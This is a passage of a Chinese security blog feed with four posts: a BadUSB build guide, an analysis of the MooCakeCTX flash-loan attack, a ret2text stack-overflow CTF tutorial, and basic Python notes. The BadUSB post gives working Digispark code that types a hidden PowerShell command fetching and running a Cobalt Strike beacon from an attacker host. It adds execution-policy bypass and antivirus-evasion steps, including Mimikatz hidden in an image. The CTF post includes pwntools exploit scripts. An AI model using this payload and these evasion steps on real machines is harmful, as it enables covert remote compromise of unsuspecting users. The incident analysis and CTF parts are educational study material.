<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/6.png" alt="6" /></p>
  </li>
</ul>

<h4 id="badusb制作">BadUsb制作：</h4>
<p>利用cs生成一个ps1的木马文件，使用ps1文件的原因是因为目前windows系统中普遍支持Powershell，并且可以直接在命令行中运行，测试起来比较方便，实际攻击过程中可能还是会使用标准的木马文件。此处为了方便测试简单监听在vps上用python（python2 -m SimpleHTTPServer 8888）起一个http服务把这个木马文件放上去,具体使用的方式非常多样。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/7.png" alt="7" /></p>
  </li>
</ul>

<p><br />需要将以下代码烧录进开发板中,将ip换成刚才的vps服务器的</p>

<pre><code class="language-arduino">#include "DigiKeyboard.h"		//定义使用虚拟键盘函数库
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76

//在初始化中运行，意思是在插入读取时运行
void setup() {

DigiKeyboard.sendKeyStroke(0);
//延时，等待确保执行完成
DigiKeyboard.delay(1000);	
//上面这两个输入是windows键+r键盘
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);	
//延时	
DigiKeyboard.delay(1000);	
//输入powershell的弹shell的代码（要绕杀毒需做免杀）
DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString('http://ip:port/beacon.ps1');"));	
DigiKeyboard.delay(500);
//输入enter键盘
DigiKeyboard.sendKeyStroke(KEY_ENTER);	
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

}
void loop() {
  //主逻辑循环这里未使用所以没有编写，可以在此处完成后渗透维权相关操作。
}
</code></pre>
<p>将代码复制到arduinoide进行烧录，点击上传后看到下面这样的代表编译成功。然后在60秒内插入BadUsb进行烧录</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/8.png" alt="8" /></p>
  </li>
</ul>

<p>这样就代表烧录成功了，拔下来然后就可以使用了</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/9.png" alt="9" /></p>
  </li>
</ul>

<h4 id="实际过程中的注意点">实际过程中的注意点：</h4>
<p>关于静默执行部分：</p>

<p>在模拟键盘操作部分可以添加下面的命令，来更好的命中</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//powershell中开启管理员权限，此处没有隐藏窗口，需要自行添加
<span class="nb">start</span><span class="na">-process </span><span class="kd">PowerShell</span> <span class="na">-verb </span><span class="nb">runas</span>
//以cmd中以管理员打开powershell
<span class="kd">powershell</span> <span class="nb">start</span><span class="na">-process </span><span class="kd">powershell</span> <span class="na">-verb </span><span class="nb">runas</span>
//部分windows由于，默认不开启ps1执行，在管理员权限下执行
//可以先获取当前权限，如果编写判断，如果权限不足可以设置如RemoteSigned/Restricted
<span class="kd">Get</span><span class="na">-ExecutionPolicy
</span>//设置权限为无认证可以执行
<span class="kd">set</span><span class="na">-executionpolicy -executionpolicy </span><span class="kd">unrestricted</span>
//在选择中选择A，全是
<span class="kd">A</span>
//接下来继续执行后门链接操作。
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/10.png" alt="10" /></p>
  </li>
</ul>

<p>关于ps1免杀部分：</p>

<p>一种可以使用免杀混淆(推荐这种，目前主要使用)，一种是直接使用键盘命令，使用arduino重构指令(比较麻烦也算是种思路)。</p>

<p>使用<a href="https://github.com/peewpw/Invoke-PSImage">Invoke-PSImage</a>免杀，官方的使用说明中已经说的非常清楚了，使用也很简单(位图免杀混淆此处不讨论。)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS&gt;Import-Module .\Invoke-PSImage.ps1
//这里可以使用"-WebRequest"生成URL的请求
PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg
</code></pre></div></div>

<p>值得注意的是，在Invoke-PSImage中可能会遇到生成文件过大失败的情况，而在cs生成的ps1中有很多代码都在if判断中不会被执行可以删除，删除之后可以解决这个问题。</p>

<p>另一种为自己写代码实现自己想要输入的键盘命令,部分代码,如果使用键盘重构可以打乱编码顺序进行混淆，下面是参考网上的代码作为布局参考:</p>
<pre><code class="language-arduino">#定义或头相关
#ifndef __DigiKeyboard_h__
...
#include "scancode-ascii-table.h"
#定义类型
...
#重构键盘
PROGMEM char usbHidReportDescriptor[USB_CFG_HID_REPORT_DESCRIPTOR_LENGTH] = { /* USB report descriptor */
  0x05, 0x01,                    // USAGE_PAGE (Generic Desktop) 
  0x09, 0x06,                    // USAGE (Keyboard) 
...
  0x29, 0x65,                    //   USAGE_MAXIMUM (Keyboard Application) 
  0x81, 0x00,                    //   INPUT (Data,Ary,Abs) 
  0xc0                           // END_COLLECTION 
};

#define MOD_CONTROL_LEFT    (1&lt;&lt;0)
...
#define MOD_GUI_RIGHT       (1&lt;&lt;7)

#define KEY_A       4
...
#define KEY_F12     69

//自定义键盘类，并在初始化中完成操作
class DigiKeyboardDevice : public Print {
 public:
  DigiKeyboardDevice () {
    cli();
    usbDeviceDisconnect();
    _delay_ms(250);
    usbDeviceConnect();
    usbInit();     
    sei();
    memset(reportBuffer, 0, sizeof(reportBuffer));      
    usbSetInterrupt(reportBuffer, sizeof(reportBuffer));
  }
    
  void update() {
    usbPoll();
  }
	
...
//实例化
DigiKeyboardDevice DigiKeyboard = DigiKeyboardDevice();
...
</code></pre>]]></content><author><name>true</name></author><category term="HID" /><category term="badusb" /><summary type="html"><![CDATA[author: by Anoxia check: by yako33]]></summary></entry><entry><title type="html">MooCakeCTX attack</title><link href="http://localhost:4000/2022/11/07/MooCakeCTX-attack.html" rel="alternate" type="text/html" title="MooCakeCTX attack" /><published>2022-11-07T11:45:00+08:00</published><updated>2022-11-07T11:45:00+08:00</updated><id>http://localhost:4000/2022/11/07/MooCakeCTX-attack</id><content type="html" xml:base="http://localhost:4000/2022/11/07/MooCakeCTX-attack.html"><![CDATA[<p>[TOC]</p>

<p>thanks by KRlyx &amp; Deft (beosin security team)</p>

<p>MooCakeCTX合约遭到闪电贷攻击，首位攻击者获得约14万美元，第二位攻击者获利约47万美元，2次攻击手法一致，MooCakeTWT于MooCakeCTX数小时后被攻击。</p>

<h4 id="事件地址信息">事件地址信息</h4>

<p>攻击交易<br />
https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a9a0d2ec8e</p>

<p>攻击者地址<br />
0x35700c4a7bd65048f01d6675f09d15771c0facd5</p>

<p>攻击合约<br />
0x71Ac864f9388eBD8e55a3cdBC501D79C3810467C</p>

<p>被攻击合约地址<br />
0x489afbAED0Ea796712c9A6d366C16CA3876D8184</p>

<h4 id="漏洞分析">漏洞分析</h4>
<p>本次攻击主要利用了抵押奖励合约中，抵押和奖励没有时间等相关的限制，并且对于调用者的防范不够全面，导致攻击者可以利用闪电贷放大分红收益，获取MooCakeCTX</p>

<h4 id="攻击流程">攻击流程</h4>
<p>1.在攻击交易0x03d363462我们可以看到2022-11-06 09:30:38 PM +UTC时攻击者利用闪电贷发起攻击,攻击者先使用闪电贷借出BUSD并把自己的钱与借入的钱一起换成vBUSD后再兑换成CAKE币用做抵押的准备资金，因为在StrategySyrup中只能使用cake币作为抵押，所以这里全部换成了cake币。而同时准备CTK币，为了smartchef能够抵押调用成功进行的转账。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/1.png" alt="1" /></p>
    <p></p>
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/2.png" alt="2" /></p>
  </li>
</ul>

<p>2.而在具体的攻击流程函数调用中我们可以看到当，当攻击者调用deposit函数后立马使用call调用了harvest函数，而这里的调用地址是一个攻击合约并且在最后看到此合约已经自毁。我们可以看到在图中harvest函数代码中，对调用地址是否是EOA地址做了判断，但当发起调用在构造函数的情况下iscontract()可以被绕过从而实现了合约调用，这是此次攻击的核心之一。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/3.png" alt="3" /></p>
    <p></p>
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/4.png" alt="4" /></p>
  </li>
</ul>

<p>3.接着就是此次攻击的问题所在，BeefyVault合约中由于奖励计算根据所占的抵押份额计算，其中更新奖励又是按照账户调用harvest函数进行更新，那么在一次更新领取奖励的轮次中，只要所占份额越大，获利越多，所以攻击者用闪电贷放大了收益(而上一次在733天前)，并且绕过了iscontract使用合约调用，值得注意的是这里的depositAll和withdrawAll中与时间没有关系，所以攻击者可以在depoist后立马调用withdrawAll领取奖励。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/5.png" alt="5" /></p>
    <p></p>
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/6.png" alt="6" /></p>
  </li>
</ul>

<p>4.攻击者又执行了两次相同手法的攻击，并归还了闪电贷,获利424 BNB(约14万)离场。并且攻击者因为操作步骤出错WBNB没有转出。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/7.png" alt="7" /></p>
  </li>
</ul>]]></content><author><name>true</name></author><category term="blockchain" /><category term="flashloan" /><category term="hacker" /><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">ret2text ROP</title><link href="http://localhost:4000/2021/06/04/ret2textROP.html" rel="alternate" type="text/html" title="ret2text ROP" /><published>2021-06-04T11:45:00+08:00</published><updated>2021-06-04T11:45:00+08:00</updated><id>http://localhost:4000/2021/06/04/ret2textROP</id><content type="html" xml:base="http://localhost:4000/2021/06/04/ret2textROP.html"><![CDATA[<p>[TOC]</p>

<h3 id="ret2text">ret2text</h3>

<h4 id="elf">ELF</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file ./pwn
</code></pre></div></div>

<p>./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9dc32140f0e317f9e6a59b9a226a5123e34ace21, not stripped</p>

<p>在计算机科学中，是一种用于<a href="https://baike.baidu.com/item/二进制文件/996661">二进制文件</a>、<a href="https://baike.baidu.com/item/可执行文件">可执行文件</a>、<a href="https://baike.baidu.com/item/目标代码/9407934">目标代码</a>、共享库和核心转储格式文件。</p>

<p>是UNIX系统实验室（<a href="https://baike.baidu.com/item/USL">USL</a>）作为应用程序二进制接口（Application Binary Interface，<a href="https://baike.baidu.com/item/ABI">ABI</a>）而开发和发布的，也是<a href="https://baike.baidu.com/item/Linux/27050">Linux</a>的主要可执行文件格式。</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec pwn
</code></pre></div></div>

<p>检查保护机制——无保护机制</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</code></pre></div></div>

<h4 id="前言">前言</h4>

<p>关于栈溢出漏洞主要的利用方式是ROP(Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到我们想要执行恶意代码的位置中。而跳转的目标有可能是一段本就已经写好的可以执行恶意命令的函数，也有可能是某个全局变量空间，甚至构造一个系统调用的cpu指令，跳转到一个libc中的函数等。最终目的都是执行恶意命令。计算机发展迭代中对于栈溢出的保护手段也越来越完善，限于ALSR，PIP等等，本文对基础的栈溢出进行一些简单的学习。</p>

<h4 id="ret2text原理">ret2text原理</h4>

<p>控制返回地址指向程序本身已有的的代码(.text)并执行</p>

<pre><code class="language-C++">#include &lt;stdlib.h&gt;
int sys(){
	system("/bin/sh");
}
int func(){
	char a[10];
	gets(a);
	puts(a);
}
int main(){
	func();
}	
</code></pre>

<p>vim ret2.c编辑一个简单C文件</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -g -fno-stack-protector -no-pie -o ret2 ret2.c
</code></pre></div></div>

<p>无保护编译，-fno关闭所有栈帧保护</p>

<h4 id="分析">分析</h4>

<p>从程序代码上看，分成三个部分，main,func,sys三个函数，sys函数中调用了/bin/sh，函数中，char a为[10]，</p>

<p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。</p>

<p>输出字符串时都使用printf，通过“%s”输出字符串,更简单的方法就是使用 puts() 函数。</p>

<p>这里获取输入的char a——gets——puts</p>

<p>程序中获取charA的gets函数无限制的取出char，突破char[10]的限制，造成在缓冲区取数据的时候造成程序溢出</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb ret2
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l(L)
</code></pre></div></div>

<p>查看源代码</p>

<p>b gets可以断点到gets函数</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b 6
</code></pre></div></div>

<p>在第六行添加Int3断点</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r
</code></pre></div></div>

<p>运行程序</p>

<p>第六行刚刚进入func内部，查看此时程序断下</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/1.png" alt="1" /></p>
  </li>
</ul>

<p>查看此时的信息，断点位置，反汇编查看sys的地址</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>disassemble sys
</code></pre></div></div>

<p>入口地址为0x4005b6也就是sys的地址</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i r rbp
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p &amp;a
</code></pre></div></div>

<p>查看当前rbp 变量a的地址</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/2.png" alt="1" /></p>
  </li>
</ul>

<p>rbp的地址 ffde40  变量a的地址 ffde30</p>

<h4 id="构造payload">构造payload</h4>

<p>func的返回地址是rbp的地址+8  =  rbp+8 = 0xffde40+8 = 0xffde48</p>

<p>填充a变量直到返回地址，然后讲后面的8个字节的地址改为sys的地址0x4005b6</p>

<p>偏移地址=输入“A”引发程序崩溃，把崩溃地址写入Payload</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./ret2"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4005b6</span><span class="p">)</span>
<span class="c1">#payload = "A" * 10
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/3.png" alt="1" /></p>
  </li>
</ul>

<h4 id="分析栈帧异常">分析栈帧异常</h4>

<p>在溢出中，可以看到stack的分析</p>

<p>gets函数重新指向main函数时，进行了push rbp的操作</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/4.png" alt="1" /></p>
  </li>
</ul>

<p>也就是说，我们让rbp的地址，指向到sys的地址</p>

<h4 id="ctf-ret2text">CTF ret2text</h4>

<p>通过ida pro分析</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/5.png" alt="1" /></p>
  </li>
</ul>

<p>这里也可以上述例子非常的像，gets函数可以引发栈溢出漏洞
在gets函数的跟踪当中可以找到secure F5反汇编</p>

<pre><code class="language-C++">int secure()
{
  unsigned int v0; // eax
  int result; // eax
  int v2; // [rsp+8h] [rbp-8h] BYREF
  int v3; // [rsp+Ch] [rbp-4h]

  v0 = time(0LL);
  srand(v0);
  v3 = rand();
  __isoc99_scanf(&amp;unk_4008C8, &amp;v2);
  result = v2;
  if ( v3 == v2 )
    result = system("/bin/sh");
  return result;
}
</code></pre>

<p>此处也调用了/bin/sh的系统命令，也就是我们需要利用这个函数，让异常引发指向他，
需要填充垃圾数据区覆盖原本的ebp的地址，让程序指针指向rbp</p>

<p>适度添加滑块以保证覆盖地址和提高exp命中率</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">'challenge-6d9543332f6f24b5.sandbox.ctfhub.com'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">22474</span>
<span class="c1">#p = process("./pwn")
</span><span class="n">p</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x78</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4007b8</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>网上已有非常多的wp，此处给出，连接后查看路径下的flag文件
代码中，python3由于数据要求，p64要求不能直接连接str，会引发EOF错误，这里使用python2，在python2中，如果由于系统原因引发错误，此处可以尝试使用p32()</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/6.png" alt="1" /></p>
  </li>
</ul>]]></content><author><name>true</name></author><category term="stackoverflow" /><category term="ROP" /><category term="binary" /><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">python notes</title><link href="http://localhost:4000/2021/05/24/python-notes.html" rel="alternate" type="text/html" title="python notes" /><published>2021-05-24T18:10:00+08:00</published><updated>2021-05-24T18:10:00+08:00</updated><id>http://localhost:4000/2021/05/24/python-notes</id><content type="html" xml:base="http://localhost:4000/2021/05/24/python-notes.html"><![CDATA[<p>[TOC]</p>

<h2 id="python基础">python基础</h2>

<h3 id="pycharm设置">pycharm设置</h3>

<p>file setting中 editor设置 font 24 code style中设置tab size 4 indent缩进4</p>

<h3 id="文件头">文件头</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span></code></pre></div></div>

<p>linux下系统的用法，告诉操作系统，使用/usr/bin/python下的</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span></code></pre></div></div>

<p>这种用法是为了防止操作系统用户没有将 python 装在默认的 /usr/bin 路径里。当系统看到这一行的时候，首先会到 env 设置里查找 python 的安装路径，再调用对应路径下的解释器程序完成操作。</p>

<p>如果没有设置env 这里的python路径就等于是写死了路径</p>

<p>windows下没有，忽略</p>

<h3 id="print">print</h3>

<p>在python2.x中使用python3.x的print函数导入<strong>__future__</strong>,包的作用是禁用python2的语句，采用python3的print</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
</code></pre></div></div>

<p>其他同理，future具有很多其他的包division/absolute_import</p>

<h3 id="python保留字">python保留字</h3>

<table>
  <thead>
    <tr>
      <th>and</th>
      <th>exec</th>
      <th>not</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>assert</td>
      <td>finally</td>
      <td>or</td>
    </tr>
    <tr>
      <td>break</td>
      <td>for</td>
      <td>pass</td>
    </tr>
    <tr>
      <td>class</td>
      <td>from</td>
      <td>print</td>
    </tr>
    <tr>
      <td>continue</td>
      <td>global</td>
      <td>raise</td>
    </tr>
    <tr>
      <td>def</td>
      <td>if</td>
      <td>return</td>
    </tr>
    <tr>
      <td>del</td>
      <td>import</td>
      <td>try</td>
    </tr>
    <tr>
      <td>elif</td>
      <td>in</td>
      <td>while</td>
    </tr>
    <tr>
      <td>else</td>
      <td>is</td>
      <td>with</td>
    </tr>
    <tr>
      <td>except</td>
      <td>lambda</td>
      <td>yield</td>
    </tr>
  </tbody>
</table>

<p>多行语句</p>

<p>使用  \   来多行</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total = item_one + \
        item_two + \
        item_three
</code></pre></div></div>

<h3 id="单行注释多行注释">单行注释多行注释</h3>

<p>#单行注释</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'''
多行注释
'''
"""
多行注释
"""
</code></pre></div></div>

<h3 id="变量赋值">变量赋值</h3>

<p>python支持int long float complex</p>

<h4 id="变量赋值切片">变量赋值切片</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="nb">str</span> <span class="c1">#完整
</span><span class="k">print</span> <span class="nb">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c1">#输出第一个字符串
</span><span class="k">print</span> <span class="nb">str</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span> <span class="c1">#输出字符串第三个到第六个
</span><span class="k">print</span> <span class="nb">str</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span> <span class="c1">#输出第三个开始
</span><span class="k">print</span> <span class="nb">str</span><span class="o">*</span><span class="mi">2</span> <span class="c1">#输出字符串两次
</span><span class="k">print</span> <span class="nb">str</span> <span class="o">+</span> <span class="s">"TEST"</span> <span class="c1">#输出连接字符串
</span></code></pre></div></div>

<h4 id="元组">元组</h4>

<p>tuple,元组无法更新，但是列表是允许更新的</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print tuple = ('run','786',678,'jokne',70.2)
</code></pre></div></div>

<p>元组中只包含一个元素时，需要在元素后面添加逗号来消除歧义</p>

<p>tuple=(50,)</p>

<p>元组可以连接,和复制</p>

<p>tup3=tup1+tup2</p>

<p>tup3=tup1 * 3               tup3=(1,2,3,1,2,3,1,2,3)</p>

<p>元组的方法（元组没有列表中的增、删、改的操作，只有查的操作</p>

<p>tuple.index(obj)  /  tuple.count(obj)</p>

<p>可以使用List转化tuple</p>

<p>tuple[0]即可访问</p>

<p>del tuple即可删除</p>

<p>tuple支持索引，L[-2]截断L[1:]</p>

<p>内置函数cmp(tup1,tup2)  计算元素个数len(tuple),max()计算最大值，min()最小值,tuple(seq)转换列表为元组</p>

<h4 id="字典">字典</h4>

<p>dict  = {}键值对，成对存在</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dict['one'] = "This is one"
print(dict['one'])  #输出键为'one' 的值
console This is one
</code></pre></div></div>

<p>tinydict = {‘name’: ‘runoob’,’code’:6734, ‘dept’: ‘sales’}</p>

<p>print tinydict.keys()  #输出所有键</p>

<p>print tinydict.values()    #输出所有值</p>

<p>dict.update(dict2)  #更新字典</p>

<p>dict.items()  以列表返回可遍历的（键，值）元组数组</p>

<h3 id="运算符">运算符</h3>

<p>次方 a**b</p>

<p>向下取整 9//2 = 4</p>

<h3 id="条件">条件</h3>

<p>if elif eles</p>

<h3 id="循环语句">循环语句</h3>

<p>while    for    while中使用for   break continue 跳出该循环，执行下一次循环, pass语句</p>

<h3 id="更新列表">更新列表</h3>

<p>list.append(‘google’)  #添加元素</p>

<h3 id="日期">日期</h3>

<p>import time</p>

<p>time.time()  #值为时间戳</p>

<p>time.localtime(time.time())</p>

<p>格式化成2016-03-20 11:45:39形式</p>

<p>print time.strftime(“%Y-%m-%d %H:%M:%S”, time.localtime())</p>

<p>格式化成Sat Mar 28 22:24:24 2016形式</p>

<p>print time.strftime(“%a %b %d %H:%M:%S %Y”, time.localtime())</p>

<p>将格式字符串转换为时间戳 a = “Sat Mar 28 22:24:24 2016”</p>

<p>print time.mktime(time.strptime(a,”%a %b %d %H:%M:%S %Y”))</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>time.sleep()推迟线程
</code></pre></div></div>

<h3 id="函数">函数</h3>

<p>def function( parameters ):</p>

<p>​	return []</p>

<p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p>

<p>只能说在传递中，传不可变对象和可变对象</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">a</span><span class="o">=</span><span class="mi">10</span>
<span class="n">b</span><span class="o">=</span><span class="mi">2</span>
<span class="n">change</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
<span class="mi">2</span>
</code></pre></div></div>

<p>局部变量a不能赋值b，传不可变对象的时候，a b指向了同一个int对象</p>

<p>传可变对象list，采用自带更新方法append即可</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">mylist</span><span class="p">):</span>
    <span class="n">mylist</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">return</span>
<span class="n">mylist</span><span class="o">=</span><span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">]</span>
<span class="n">change</span><span class="p">(</span><span class="n">mylist</span><span class="p">)</span>
</code></pre></div></div>

<p>参数</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def printme(str):
	return
</code></pre></div></div>

<p>调用函数，需要填入参数</p>

<p>默认参数</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def printme(age=50):
	return
</code></pre></div></div>

<p>如果没有传递，则为默认参数</p>

<p>lambda是一个表达式</p>

<p>sum = lambda arg1,arg2:arg1+arg2</p>

<h3 id="语法糖">语法糖</h3>

<p>就相当于汉语里的成语,用更简练的言语表达较复杂的含义。在得到广泛接受的情况之下，可以提升交流的效率,语法糖就是为了避免coder出现错误并提高效率的语法层面的一种优雅的解决方案。</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
    <span class="p">...</span> 
<span class="p">}</span>
</code></pre></div></div>

<p>就是while的语法糖</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">){</span>
    <span class="p">...</span>
    <span class="nx">i</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>y+=x是y=y+x的语法糖</p>

<h3 id="继承">继承</h3>
<p>Car类是父类，Aodi是子类继承于Car,继承也可以设置其他方法,代码只需做少部分改进,类遵循驼峰命名，方法小写，私有方法加下划线</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# -*- coding: utf-8 -*-
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">class</span> <span class="nc">Car</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"我是车"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Aodi</span><span class="p">(</span><span class="n">Car</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"奥迪车"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Bmw</span><span class="p">(</span><span class="n">Car</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"宝马车"</span><span class="p">)</span>

   <span class="k">def</span> <span class="nf">price</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
       <span class="k">print</span><span class="p">(</span><span class="s">"50万"</span><span class="p">)</span>

<span class="n">c</span> <span class="o">=</span> <span class="n">Car</span><span class="p">()</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">Aodi</span><span class="p">()</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">Bmw</span><span class="p">()</span>
<span class="n">c</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
<span class="n">d</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
<span class="n">f</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
<span class="n">f</span><span class="p">.</span><span class="n">price</span><span class="p">()</span>
</code></pre></div></div>

